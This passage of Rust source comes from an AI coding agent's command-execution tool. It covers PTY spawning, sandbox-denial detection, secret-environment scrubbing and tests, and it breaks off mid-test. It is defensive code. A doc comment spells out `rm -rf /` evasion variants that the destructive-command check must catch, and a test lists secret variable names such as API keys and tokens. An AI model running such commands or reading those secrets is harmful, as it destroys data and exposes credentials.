    // conhost emits a cursor-position query (ESC[6n) and stalls ALL output
    // until it reads a reply. Prime it once with "cursor at 1;1": conhost
    // consumes the reply itself, so the child never sees these bytes. The
    // writer must then live exactly as long as the master (an early close
    // can detach the pseudoconsole), so it moves into the waiter below and
    // drops alongside the master. Both steps sit BEFORE the spawn, so a
    // failure here still falls back to pipes without double-running.
    #[cfg(windows)]
    let writer = {
        use std::io::Write as _;
        let mut writer = pair.master.take_writer().map_err(std::io::Error::other)?;
        writer.write_all(b"\x1b[1;1R")?;
        writer
    };

    let mut builder = CommandBuilder::new(&invocation.program);
    builder.args(&invocation.args);
    builder.cwd(workdir);
    for name in secret_env_names() {
        builder.env_remove(name);
    }
    // Still load-bearing on a PTY: git COULD prompt here and nothing feeds
    // the master, so it must fail fast instead of sitting on the prompt.
    builder.env("GIT_TERMINAL_PROMPT", "0");
    builder.env("TERM", "xterm-256color");
    // Same export the pipe/background paths apply via `export_scratchpad_env`
    // — keep the spawn paths from drifting.
    if let Some(dir) = scratchpad {
        builder.env(SCRATCHPAD_ENV_VAR, dir);
    }

    let mut child = pair
        .slave
        .spawn_command(builder)
        .map_err(std::io::Error::other)?;
    // Drop the slave so the master reads EOF when the child exits.
    drop(pair.slave);
    let pid = child.process_id();
    let master = pair.master;

    let log_path = background_log_path();
    let log =
        create_tee_log_blocking(&log_path).map(|f| std::sync::Arc::new(tokio::sync::Mutex::new(f)));

    // Reader thread: blocking pty reads into a bounded channel.
    let (chunk_tx, mut chunk_rx) = tokio::sync::mpsc::channel::<Vec<u8>>(32);
    let reader_thread = tokio::task::spawn_blocking(move || {
        let mut buf = [0u8; 8192];
        loop {
            match reader.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    if chunk_tx.blocking_send(buf[..n].to_vec()).is_err() {
                        break;
                    }
                },
            }
        }
    });

    let drain = tokio::spawn(async move {
        let mut drain = PtyDrain {
            capture: CappedCapture::new(mermaid_model::constants::MAX_TOOL_OUTPUT_BYTES),
            log,
            logged: 0,
            log_capped: false,
            line_buf: String::new(),
            progress,
        };
        while let Some(chunk) = chunk_rx.recv().await {
            drain.push(&chunk).await;
        }
        drain.capture.finish()
    });

    // Waiter owns the child AND the master: the master must outlive the
    // child (dropping it early can SIGHUP the session on Unix / detach the
    // ConPTY on Windows), and dropping it right after `wait` returns
    // unblocks the reader thread — EOF/EIO on Unix; on Windows the master
    // and (already-dropped) slave share the pseudoconsole, so the last drop
    // runs ClosePseudoConsole, conhost exits, and the reader's duplicated
    // handle EOFs — the drain always finishes. (A reader wedged by a hung
    // conhost would leak bounded-by-process; the timeout arm below is an
    // independent backstop, so no read timeout on the drain.)
    let (done_tx, done_rx) = tokio::sync::oneshot::channel();
    let driver = tokio::spawn(async move {
        let status = tokio::task::spawn_blocking(move || {
            let status = child.wait();
            // The CPR priming writer must drop WITH the master, never
            // before it (early close = detach risk).
            #[cfg(windows)]
            drop(writer);
            drop(master);
            status
        })
        .await;
        let (output, truncated) = drain.await.unwrap_or_default();
        let _ = reader_thread.await;
        let _ = done_tx.send((output, truncated, status));
    });

    let timeout_fut = tokio::time::sleep(timeout);

    tokio::select! {
        biased;
        _ = background.cancelled() => {
            match pid {
                // Ctrl+B detach: stop listening; the blocking wait/read
                // threads keep running, the log keeps filling, and the child
                // survives Mermaid's exit (nothing is kill-on-drop here).
                Some(pid) => {
                    drop(driver);
                    Ok(CommandRunResult::Detached { pid, log_path })
                },
                None => {
                    driver.abort();
                    let _ = tokio::fs::remove_file(&log_path).await;
                    Ok(CommandRunResult::Cancelled)
                },
            }
        }
        _ = token.cancelled() => {
            // Unix: the child is the session/group leader (portable-pty
            // setsids), so the group-kill takes the whole tree, exactly like
            // the pipe path; the reader then unblocks at EOF/EIO. Windows:
            // `terminate_tree` kills the tree by pid (`taskkill /T`); the
            // waiter's `wait` then returns and drops the master, which
            // closes the pseudoconsole and EOFs the reader. Neither arm
            // reads the exit status, so killed-child exit-code quirks on
            // Windows never surface here.
            if let Some(p) = pid {
                mermaid_model::utils::terminate_tree(p, mermaid_model::utils::Grace::Immediate).await;
            }
            driver.abort();
            let _ = tokio::fs::remove_file(&log_path).await;
            Ok(CommandRunResult::Cancelled)
        }
        res = done_rx => {
            let _ = tokio::fs::remove_file(&log_path).await;
            let (raw, _truncated, status) = res
                .map_err(|_| std::io::Error::other("pty driver dropped before completing"))?;
            let status = status
                .map_err(|e| std::io::Error::other(format!("pty waiter panicked: {e}")))?
                .map_err(std::io::Error::other)?;
            // Sanitize the WHOLE capture once (escape sequences can span
            // chunk boundaries; per-chunk stripping is progress-only).
            let mut output = strip_ansi(&raw);
            // portable-pty reports a terminating signal by NAME; SIGSYS is
            // the one downstream consumer (the seccomp denial mapping) —
            // `128 + SIGSYS` shell-reaped exits flow through exit_code as-is.
            // On Windows `signal()` is always None, so the exit-code arm is
            // taken unconditionally (the seccomp sandbox is Linux-only
            // anyway) — no cfg needed on these arms.
            let (exit_code, signal) = match status.signal() {
                Some(name) if name.eq_ignore_ascii_case("bad system call") => {
                    (None, Some(SANDBOX_KILL_SIGNAL))
                },
                Some(_) => (None, None),
                None => (Some(status.exit_code() as i32), None),
            };
            if !status.success() {
                output.push_str(&format!(
                    "\n--- Command exited with status: {} ---",
                    exit_code.unwrap_or(-1)
                ));
            }
            let stdout_lines = output.lines().count();
            Ok(CommandRunResult::Completed(CommandRunOutput {
                output,
                exit_code,
                signal,
                // One merged stream on a PTY — there is no stderr split.
                stdout_lines,
                stderr_lines: 0,
            }))
        }
        _ = timeout_fut => {
            if let Some(p) = pid {
                mermaid_model::utils::terminate_tree(p, mermaid_model::utils::Grace::Immediate).await;
            }
            driver.abort();
            let _ = tokio::fs::remove_file(&log_path).await;
            Ok(CommandRunResult::TimedOut)
        }
    }
}

/// Defense-in-depth pre-check for obviously destructive commands, run before
/// the policy engine. Delegates to `mermaid_runtime::is_destructive_command`,
/// which segments the command the way `sh -c` would and classifies each head on
/// the TOKENIZED form — so spacing, case, quoting, flag bundling, and chaining
/// can't trivially evade it (the substring blocklist this replaced could be
/// dodged by `RM -RF /`, `rm  -rf  /`, or `echo x; rm -rf /` — #114). NOT a
/// security boundary: the real boundary is deny-by-default + the policy engine,
/// whose hard-deny this mirrors.
fn contains_dangerous_command(command: &str) -> bool {
    mermaid_runtime::is_destructive_command(command)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::domain::{ToolCallId, TurnId};
    use crate::providers::ctx::test_exec_context;
    use std::path::PathBuf;

    #[test]
    fn network_denial_detects_sigsys_and_reaped_child_exit() {
        let out = |exit: Option<i32>, signal: Option<i32>| CommandRunOutput {
            output: String::new(),
            exit_code: exit,
            signal,
            stdout_lines: 0,
            stderr_lines: 0,
        };
        // The shell itself was SIGSYS-killed.
        assert!(is_sigsys_denial(&out(None, Some(31))));
        // The shell reaped a SIGSYS-killed child and exited 128 + 31.
        assert!(is_sigsys_denial(&out(Some(159), None)));
        // Ordinary failures / success / a different signal are not denials.
        assert!(!is_sigsys_denial(&out(Some(1), None)));
        assert!(!is_sigsys_denial(&out(Some(0), None)));
        assert!(!is_sigsys_denial(&out(None, Some(11)))); // SIGSEGV, not SIGSYS
    }

    #[test]
    fn detect_denial_gates_on_active_policies() {
        let out = |exit: Option<i32>, signal: Option<i32>, output: &str| CommandRunOutput {
            output: output.to_string(),
            exit_code: exit,
            signal,
            stdout_lines: 0,
            stderr_lines: 0,
        };
        // Sandbox off for this spawn: nothing is ever labeled a denial, no
        // matter how denial-shaped the failure looks.
        assert_eq!(
            detect_denial(&out(Some(159), None, "Permission denied"), false, false),
            None
        );
        assert_eq!(detect_denial(&out(None, Some(31), ""), false, false), None);
        // A clean success is never a denial even with both policies active.
        assert_eq!(detect_denial(&out(Some(0), None, ""), true, true), None);
        #[cfg(target_os = "linux")]
        {
            // Precise SIGSYS signature maps to Network; permission text with
            // only the FS sandbox active maps to Filesystem.
            assert_eq!(
                detect_denial(&out(None, Some(31), ""), true, true),
                Some(DenialKind::Network)
            );
            assert_eq!(
                detect_denial(&out(Some(1), None, "Permission denied"), false, true),
                Some(DenialKind::Filesystem)
            );
            // Linux network denials are SIGSYS-only: permission text alone
            // does not implicate the network sandbox.
            assert_eq!(
                detect_denial(&out(Some(1), None, "Permission denied"), true, false),
                None
            );
        }
        #[cfg(target_os = "macos")]
        {
            // Seatbelt: hedged EPERM text; both-active is ambiguous.
            let eperm = out(Some(1), None, "curl: Operation not permitted");
            assert_eq!(
                detect_denial(&eperm, true, false),
                Some(DenialKind::Network)
            );
            assert_eq!(
                detect_denial(&eperm, false, true),
                Some(DenialKind::Filesystem)
            );
            assert_eq!(
                detect_denial(&eperm, true, true),
                Some(DenialKind::Ambiguous)
            );
        }
    }

    #[test]
    fn fs_denial_requires_failure_and_permission_signature() {
        let out = |exit: Option<i32>, output: &str| CommandRunOutput {
            output: output.to_string(),
            exit_code: exit,
            signal: None,
            stdout_lines: 0,
            stderr_lines: 0,
        };
        // Non-zero exit + the permission-error text ⇒ denial signature.
        assert!(is_permission_denial(&out(
            Some(1),
            "sh: line 1: /etc/nope: Permission denied"
        )));
        assert!(is_permission_denial(&out(
            Some(2),
            "touch: Operation not permitted"
        )));
        // A successful command mentioning the phrase is not a denial…
        assert!(!is_permission_denial(&out(
            Some(0),
            "grep found: Permission denied"
        )));
        // …nor is an ordinary failure without it, or a signal death.
        assert!(!is_permission_denial(&out(Some(1), "some other failure")));
        assert!(!is_permission_denial(&out(None, "Permission denied")));
    }

    #[test]
    fn sandboxed_shell_wraps_only_when_requested() {
        let plain = build_sandboxed_shell("echo hi", false, None);
        let plain_prog = plain.as_std().get_program().to_string_lossy().into_owned();
        assert!(
            ["sh", "pwsh", "powershell"].contains(&plain_prog.as_str()),
            "plain shell program: {plain_prog}"
        );

        let wrapped = build_sandboxed_shell("echo hi", true, None);
        let args: Vec<String> = wrapped
            .as_std()
            .get_args()
            .map(|a| a.to_string_lossy().into_owned())
            .collect();
        assert_eq!(args.first().map(String::as_str), Some("__sandbox-exec"));
        assert!(args.contains(&"--no-network".to_string()));
        assert!(!args.contains(&"--confine-writes".to_string()));
        assert!(args.contains(&"sh".to_string()));
    }

    #[test]
    fn sandboxed_shell_passes_confine_writes_dirs() {
        let dirs = vec![PathBuf::from("/proj"), PathBuf::from("/dev")];
        let wrapped = build_sandboxed_shell("echo hi", false, Some(&dirs));
        let args: Vec<String> = wrapped
            .as_std()
            .get_args()
            .map(|a| a.to_string_lossy().into_owned())
            .collect();
        assert_eq!(args.first().map(String::as_str), Some("__sandbox-exec"));
        assert!(!args.contains(&"--no-network".to_string()));
        // Each dir rides its own `--confine-writes`.
        assert_eq!(
            args.iter().filter(|a| *a == "--confine-writes").count(),
            2,
            "args: {args:?}"
        );
        assert!(args.contains(&"/proj".to_string()));
        assert!(args.contains(&"/dev".to_string()));
    }

    #[test]
    fn powershell_wrap_carries_stop_pref_and_exit_code_trailer() {
        let wrapped = powershell_wrap("cargo build");
        assert!(wrapped.starts_with("$ErrorActionPreference='Stop'\n"));
        assert!(wrapped.contains("cargo build"));
        assert!(wrapped.ends_with("{ exit $LASTEXITCODE }"));
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn windows_shell_invocation_is_powershell() {
        let inv = shell_invocation("echo hi", false, None);
        let prog = inv.program.to_string_lossy().into_owned();
        assert!(prog == "pwsh" || prog == "powershell", "program: {prog}");
        let args: Vec<String> = inv
            .args
            .iter()
            .map(|a| a.to_string_lossy().into_owned())
            .collect();
        assert_eq!(&args[..3], ["-NoProfile", "-NonInteractive", "-Command"]);
        assert!(args[3].contains("echo hi"), "args: {args:?}");
    }

    /// Without the powershell_wrap trailer, PowerShell collapses a native
    /// child's exit code to 0/1 — `cargo build` failing with 101 would look
    /// clean. `cmd /c exit 7` is the minimal native command with a nonzero code.
    #[cfg(target_os = "windows")]
    #[tokio::test]
    async fn windows_native_exit_code_propagates() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), std::env::temp_dir());
        let outcome = ExecuteCommandTool
            .execute(serde_json::json!({"command": "cmd /c exit 7"}), ctx)
            .await;
        match &outcome.metadata.detail {
            crate::domain::ToolMetadata::ExecuteCommand { exit_code, .. } => {
                assert_eq!(*exit_code, Some(7), "outcome: {outcome:?}");
            },
            other => panic!("unexpected metadata: {other:?}"),
        }
    }

    /// The point of the switch: PowerShell-native syntax must actually run.
    #[cfg(target_os = "windows")]
    #[tokio::test]
    async fn windows_powershell_syntax_works() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), std::env::temp_dir());
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({"command": "Write-Output ('mermaid-' + 'ps')"}),
                ctx,
            )
            .await;
        assert!(outcome.is_success(), "outcome: {outcome:?}");
        assert!(
            outcome.output().contains("mermaid-ps"),
            "output: {}",
            outcome.output()
        );
    }

    #[tokio::test]
    async fn tee_log_is_capped() {
        // #126: the on-disk tee log must be bounded so a command spewing
        // gigabytes can't fill the temp dir, even though the in-memory buffer is
        // already capped.
        let dir = std::env::temp_dir().join(format!("mermaid_teelog_{}", std::process::id()));
        let _ = std::fs::create_dir_all(&dir);
        let path = dir.join("log.txt");
        let file = tokio::fs::File::create(&path).await.unwrap();
        let log = std::sync::Arc::new(tokio::sync::Mutex::new(file));
        // 4000 bytes of output, on-disk log capped at 16.
        let data = vec![b'x'; 4000];
        let _ = read_capped(&data[..], 1_000_000, 16, None, Some(log)).await;
        let written = std::fs::read(&path).unwrap();
        assert!(
            written.len() < 200,
            "log must be capped near 16 bytes + marker, got {}",
            written.len()
        );
        assert!(String::from_utf8_lossy(&written).contains("log truncated"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn tee_log_created_owner_only_and_refuses_existing() {
        // #F14/#F15: the tee log (which can capture secret-bearing stdout) must
        // be owner-only, and the O_EXCL create must refuse a pre-existing path —
        // the same guard that refuses to follow a symlink planted at the
        // predictable name.
        use std::os::unix::fs::PermissionsExt;
        let dir = std::env::temp_dir().join(format!("mermaid_loghard_{}", std::process::id()));
        let _ = std::fs::create_dir_all(&dir);
        let path = dir.join("bg.log");
        let _ = std::fs::remove_file(&path);

        let file = create_log_file_blocking(&path).expect("first create succeeds");
        drop(file);
        let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o600, "tee log must be owner-only, got {mode:o}");

        // O_EXCL: a second create at the same path (e.g. an attacker-planted
        // symlink/file) is refused rather than followed/truncated.
        assert!(
            create_log_file_blocking(&path).is_err(),
            "O_EXCL must refuse an existing path"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn secret_env_name_denylist_covers_common_carriers() {
        // #4: secrets the old denylist missed.
        for name in [
            "ANTHROPIC_API_KEY",
            "AWS_SECRET_ACCESS_KEY",
            "GITHUB_TOKEN",
            "MY_SERVICE_PRIVATE_KEY",
            "DATABASE_URL",
            "SENTRY_DSN",
            "SLACK_WEBHOOK_URL",
            "KUBECONFIG",
            "SSH_AUTH_SOCK",
            "DB_PASSWORD",
            "PG_CONNECTION_STRING",
        ] {
            assert!(is_secret_env_name(name), "{name} should be scrubbed");
        }
        // Ordinary build/run vars must survive.
        for name in [
            "PATH",
            "HOME",
            "CARGO_HOME",
            "LANG",
            "XAUTHORITY",
            "RUSTUP_HOME",
        ] {
            assert!(!is_secret_env_name(name), "{name} should NOT be scrubbed");
        }
    }

    #[tokio::test]
    async fn out_of_project_working_dir_is_escalated_and_blocked() {
        // #1: a read-only command auto-runs in-project, but the same command
        // with an out-of-project working_dir is escalated to ExternalDirectory
        // and denied (here, by ReadOnly mode — proving it's no longer treated
        // as an auto-allowable in-project read).
        let project = std::env::temp_dir().join(format!("mermaid_wd_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&project);
        std::fs::create_dir_all(&project).unwrap();
        let outside = project.parent().unwrap().to_path_buf();

        let mk_ctx = || {
            let (tx, rx) = tokio::sync::mpsc::channel(64);
            let mut config = crate::domain::Config::default();
            config.safety.mode = mermaid_runtime::SafetyMode::ReadOnly;
            let ctx = crate::providers::ctx::ExecContext::new(
                tokio_util::sync::CancellationToken::new(),
                tx,
                ToolCallId(1),
                TurnId(1),
                project.clone(),
                std::sync::Arc::new(config),
                String::new(),
                None,
                None,
                None,
                mermaid_runtime::SafetyMode::ReadOnly,
                None,
                None,
                None,
                None,
                None,
            );
            (ctx, rx)
        };

        let (ctx, _rx) = mk_ctx();
        let outcome = ExecuteCommandTool
            .execute(serde_json::json!({"command": "echo hi"}), ctx)
            .await;
        assert!(
            outcome.is_success(),
            "in-project read-only echo should run: {outcome:?}",
        );

        let (ctx, _rx) = mk_ctx();
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({
                    "command": "echo hi",
                    "working_dir": outside.display().to_string(),
                }),
                ctx,
            )
            .await;
        assert_eq!(
            outcome.status,
            crate::domain::ToolStatus::Error,
            "out-of-project working_dir must be escalated + blocked: {outcome:?}",
        );

        let _ = std::fs::remove_dir_all(&project);
    }

    /// The plan-file carve-out is the ONE writable path in plan mode, and it
    /// is matched lexically. Every previous test for it drove `gate()`
    /// directly, which never sees `working_dir` — so the gate matched
    /// `.mermaid/plans/x.md` against the project root while the command ran
    /// somewhere else and wrote a different file. Drive the real tool.
    #[tokio::test]
    async fn plan_write_carve_out_respects_the_effective_working_dir() {
        let project = std::env::temp_dir().join(format!("mermaid_planwd_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&project);
        std::fs::create_dir_all(project.join(".mermaid/plans")).unwrap();
        // A second tree INSIDE the project, so containment stays `Project`
        // and only the cwd differs — the benign shape of the bug.
        std::fs::create_dir_all(project.join("sub")).unwrap();
        let plan_file = project.join(".mermaid/plans/x.md");

        let mk_ctx = || {
            let (tx, rx) = tokio::sync::mpsc::channel(64);
            let mut config = crate::domain::Config::default();
            config.safety.mode = mermaid_runtime::SafetyMode::ReadOnly;
            config.safety.checkpoint_on_mutation = false;
            let mut ctx = crate::providers::ctx::ExecContext::new(
                tokio_util::sync::CancellationToken::new(),
                tx,
                ToolCallId(1),
                TurnId(1),
                project.clone(),
                std::sync::Arc::new(config),
                String::new(),
                None,
                None,
                None,
                mermaid_runtime::SafetyMode::ReadOnly,
                None,
                None,
                None,
                None,
                None,
            );
            ctx.plan_file = Some(plan_file.clone());
            (ctx, rx)
        };

        // Baseline: the plan write from the project root is allowed and the
        // plan file really appears where the gate said it would.
        let (ctx, _rx) = mk_ctx();
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({"command": "echo plan > .mermaid/plans/x.md"}),
                ctx,
            )
            .await;
        assert!(
            outcome.is_success(),
            "plan write must be allowed: {outcome:?}"
        );
        assert!(
            plan_file.exists(),
            "the plan file is the file that got written"
        );

        // The bug: same relative redirect, different cwd. The gate resolved
        // it against the project root and approved a write to
        // `<project>/sub/.mermaid/plans/x.md` — a file that is NOT the plan.
        let (ctx, _rx) = mk_ctx();
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({
                    "command": "echo elsewhere > .mermaid/plans/x.md",
                    "working_dir": project.join("sub").display().to_string(),
                }),
                ctx,
            )
            .await;
        assert_eq!(
            outcome.status,
            crate::domain::ToolStatus::Error,
            "a plan-relative write from another cwd is not a plan write: {outcome:?}",
        );
        assert!(
            !project.join("sub/.mermaid/plans/x.md").exists(),
            "nothing may be written outside the plan path",
        );

        let _ = std::fs::remove_dir_all(&project);
    }

    #[tokio::test]
    async fn safe_command_runs_and_captures_output() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), PathBuf::from("/tmp"));
        // Quoted so PowerShell's echo (Write-Output) prints one line, not one
        // line per bare argument.
        let outcome = ExecuteCommandTool
            .execute(serde_json::json!({"command": "echo 'hello world'"}), ctx)
            .await;
        assert!(outcome.is_success(), "expected success: {:?}", outcome);
        assert!(outcome.output().contains("hello world"));
    }

    /// The foreground child must be a session leader (sid == its own pid).
    /// This is the non-vacuous half of the /dev/tty fix: a new session has no
    /// controlling terminal, so `sudo`-style prompts fail instead of writing
    /// over the TUI. Linux-only: probes /proc (field 6 of stat is the sid).
    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn foreground_child_runs_in_new_session() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), PathBuf::from("/tmp"));
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({
                    "command": r#"test "$(awk '{print $6}' /proc/$$/stat)" = "$$" && echo NEW_SESSION_OK || echo "NOT_A_SESSION_LEADER sid=$(awk '{print $6}' /proc/$$/stat) pid=$$""#,
                }),
                ctx,
            )
            .await;
        assert!(outcome.is_success(), "expected success: {outcome:?}");
        assert!(
            outcome.output().contains("NEW_SESSION_OK"),
            "child shell is not a session leader: {}",
            outcome.output()
        );
    }

    /// The sudo-incident invariant, PTY era: `/dev/tty` must resolve to the
    /// CAPTURED pty, never the user's terminal — a prompt writes into the
    /// tool output instead of over the TUI. (The pipe path keeps the old
    /// stricter guarantee — see the pipes-mode test below.)
    #[cfg(unix)]
    #[tokio::test]
    async fn pty_child_dev_tty_is_the_captured_pty() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), PathBuf::from("/tmp"));
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({
                    "command": "if echo CAPTURED_BY_PTY > /dev/tty 2>/dev/null; then echo TTY_OPEN_OK; else echo TTY_OPEN_DENIED; fi",
                }),
                ctx,
            )
            .await;
        assert!(outcome.is_success(), "expected success: {outcome:?}");
        assert!(
            outcome.output().contains("TTY_OPEN_OK"),
            "PTY child should see a controlling terminal: {}",
            outcome.output()
        );
        assert!(
            outcome.output().contains("CAPTURED_BY_PTY"),
            "/dev/tty writes must land in the CAPTURE, not the user's terminal: {}",
            outcome.output()
        );
    }

    /// Direct regression for the sudo incident on the PIPE path
    /// (`[exec] pty = false`): a child that opens `/dev/tty` must fail. Only
    /// meaningful where the test process itself has a controlling terminal —
    /// CI runners have none (the open fails for everyone there), so skip
    /// explicitly rather than pass vacuously.
    #[cfg(unix)]
    #[tokio::test]
    async fn foreground_child_cannot_open_dev_tty() {
        if std::fs::File::open("/dev/tty").is_err() {
            eprintln!("skipped: no controlling terminal in test environment");
            return;
        }
        let (ctx, _rx) = pipes_ctx();
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({
                    "command": "if echo x > /dev/tty 2>/dev/null; then echo TTY_OPEN_OK; else echo TTY_OPEN_DENIED; fi",
                }),
                ctx,
            )
            .await;
        assert!(
            outcome.output().contains("TTY_OPEN_DENIED"),
            "session-detached child could still open /dev/tty: {}",
            outcome.output()
        );
    }

    /// Pipe-mode context: `[exec] pty = false` pins the pipe spawn path.
    fn pipes_ctx() -> (
        crate::providers::ctx::ExecContext,
        tokio::sync::mpsc::Receiver<crate::domain::ProgressEvent>,
    ) {
        let mut config = crate::domain::Config::default();
        config.safety.mode = mermaid_runtime::SafetyMode::FullAccess;
        config.exec.pty = Some(false);
        crate::providers::ctx::test_exec_context_with_config(
            TurnId(1),
            ToolCallId(1),
            std::env::temp_dir(),
            config,
        )
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn pty_child_sees_a_terminal_and_pipes_child_does_not() {
        // PTY (default): isatty(stdout) is true and `tty` names a pts.
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), PathBuf::from("/tmp"));
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({"command": "if [ -t 1 ]; then echo IS_TTY; fi; tty"}),
                ctx,
            )
            .await;
        assert!(outcome.is_success(), "{outcome:?}");
        assert!(outcome.output().contains("IS_TTY"), "{}", outcome.output());
        assert!(
            outcome.output().contains("/dev/pts/") || outcome.output().contains("/dev/tty"),
            "tty should name the pts: {}",
            outcome.output()
        );
        // Pipes (`pty = false`): not a terminal.
        let (ctx, _rx) = pipes_ctx();
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({"command": "if [ -t 1 ]; then echo IS_TTY; else echo NOT_TTY; fi"}),
                ctx,
            )
            .await;
        assert!(outcome.output().contains("NOT_TTY"), "{}", outcome.output());
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn pty_output_is_ansi_clean_and_crlf_normalized() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), PathBuf::from("/tmp"));
        // A color-emitting printf: the capture must carry the words, none of
        // the escape bytes, and PTY ONLCR \r\n must read back as plain \n.
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({
                    "command": r"printf '\033[31mRED\033[0m\nline2\n'",
                }),
                ctx,
            )
            .await;
        assert!(outcome.is_success(), "{outcome:?}");
        let out = outcome.output();
        assert!(out.contains("RED\nline2"), "clean joined lines: {out:?}");
        assert!(!out.contains('\u{1b}'), "no escape bytes: {out:?}");
        assert!(!out.contains('\r'), "no carriage returns: {out:?}");
    }

    /// Windows twin of the unix isatty split: under ConPTY the child gets a
    /// real console (`IsOutputRedirected` is False); under `pty = false`
    /// pipes it sees redirected handles (True).
    #[cfg(windows)]
    #[tokio::test]
    async fn pty_child_sees_a_console_and_pipes_child_does_not() {
        let probe = "powershell -NoProfile -Command [Console]::IsOutputRedirected";
        // ConPTY (default): stdout is a console.
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), std::env::temp_dir());
        let outcome = ExecuteCommandTool
            .execute(serde_json::json!({ "command": probe }), ctx)
            .await;
        assert!(outcome.is_success(), "{outcome:?}");
        assert!(
            outcome.output().contains("False"),
            "ConPTY child must see a console: {}",
            outcome.output()
        );
        // Pipes (`pty = false`): stdout is redirected.
        let (ctx, _rx) = pipes_ctx();
        let outcome = ExecuteCommandTool
            .execute(serde_json::json!({ "command": probe }), ctx)
            .await;
        assert!(outcome.is_success(), "{outcome:?}");
        assert!(
            outcome.output().contains("True"),
            "pipe child must see redirected stdout: {}",
            outcome.output()
        );
    }

    /// Windows twin of the unix ANSI/CRLF test: ConPTY output reaches the
    /// model with escapes stripped and CRLF normalized. Line matching is
    /// whitespace-tolerant because ConPTY repaints pad lines to the
    /// pseudoconsole width.
    #[cfg(windows)]
    #[tokio::test]
    async fn pty_output_is_ansi_clean_and_crlf_normalized_windows() {
        let (ctx, _rx) = test_exec_context(TurnId(1), ToolCallId(1), std::env::temp_dir());
        let outcome = ExecuteCommandTool
            .execute(
                serde_json::json!({ "command": "echo RED; echo line2" }),
                ctx,
            )
            .await;
        assert!(outcome.is_success(), "{outcome:?}");
        let out = outcome.output();
        assert!(!out.contains('\u{1b}'), "no escape bytes: {out:?}");
        assert!(!out.contains('\r'), "no carriage returns: {out:?}");
        let lines: Vec<&str> = out.lines().map(str::trim).collect();
        assert!(lines.contains(&"RED"), "RED line present: {out:?}");
        assert!(lines.contains(&"line2"), "line2 line present: {out:?}");
    }

    #[test]
    fn strip_ansi_drops_escapes_and_normalizes_line_endings() {
        // CSI color + cursor movement, OSC title (BEL and ST terminated),
        // two-byte ESC, CRLF and lone CR.
        assert_eq!(strip_ansi("\u{1b}[31mRED\u{1b}[0m"), "RED");
        assert_eq!(strip_ansi("\u{1b}[2K\u{1b}[1Gline"), "line");
        assert_eq!(strip_ansi("\u{1b}]0;title\u{7}body"), "body");
        assert_eq!(strip_ansi("\u{1b}]8;;url\u{1b}\\link"), "link");
        assert_eq!(strip_ansi("\u{1b}=keypad"), "keypad");
        assert_eq!(strip_ansi("a\r\nb"), "a\nb");
        assert_eq!(strip_ansi("50%\r100%\r\n"), "50%\n100%\n");
        // String sequences (DCS/SOS/PM/APC): the payload is consumed
        // through the ST terminator, not leaked into the text.
        assert_eq!(strip_ansi("\u{1b}P1$r0m\u{1b}\\text"), "text");
        assert_eq!(strip_ansi("\u{1b}_payload\u{1b}\\ok"), "ok");
        assert_eq!(strip_ansi("\u{1b}Xsos\u{1b}\\a\u{1b}^pm\u{1b}\\b"), "ab");
        // Backspace erases the previous character; bare BEL disappears.
        assert_eq!(strip_ansi("ab\u{8}c"), "ac");
        assert_eq!(strip_ansi("x\u{7}y"), "xy");
        // Backspace never eats a line break (or pops from empty output).
        assert_eq!(strip_ansi("a\n\u{8}b"), "a\nb");
        assert_eq!(strip_ansi("\u{8}b"), "b");
        // Plain text passes through untouched.
        assert_eq!(strip_ansi("plain text"), "plain text");
        // Truncated escape at end of input must not panic.
        assert_eq!(strip_ansi("x\u{1b}"), "x");
        assert_eq!(strip_ansi("x\u{1b}[31"), "x");
        // Truncated string sequence at end of input must not panic either.
        assert_eq!(strip_ansi("x\u{1b}Pdangling"), "x");
    }

    #[test]
    fn capped_capture_keeps_head_and_tail() {
        // Under the cap: byte-exact round trip.
        let mut c = CappedCapture::new(64);
        c.push(b"hello ");
        c.push(b"world");
        let (out, truncated) = c.finish();
        assert_eq!(out, "hello world");
        assert!(!truncated);
        // Over the cap: head survives, tail survives, middle elided.
        let mut c = CappedCapture::new(20);
        c.push(b"AAAAAAAAAA");
        c.push(&[b'x'; 100]);
        c.push(b"BBBBBBBBBB");
        let (out, truncated) = c.finish();
        assert!(truncated);
        assert!(out.starts_with("AAAAAAAAAA"), "head kept: {out:?}");
        assert!(out.ends_with("BBBBBBBBBB"), "tail kept: {out:?}");
        assert!(out.contains("truncated"), "marker present: {out:?}");
    }

    #[test]
    fn secret_env_names_reports_planted_secret() {
        // Uses the process env (read-only) — plant via temp_env.
        temp_env::with_var("MERMAID_TEST_PLANTED_API_KEY", Some("v"), || {
            let names = secret_env_names();
            assert!(
                names.iter().any(|n| n == "MERMAID_TEST_PLANTED_API_KEY"),
                "planted secret name must be scrubbed: {names:?}"
            );
            assert!(!names.iter().any(|n| n == "PATH"));
        });
    }

    #[test]
    fn harden_env_sets_git_terminal_prompt() {
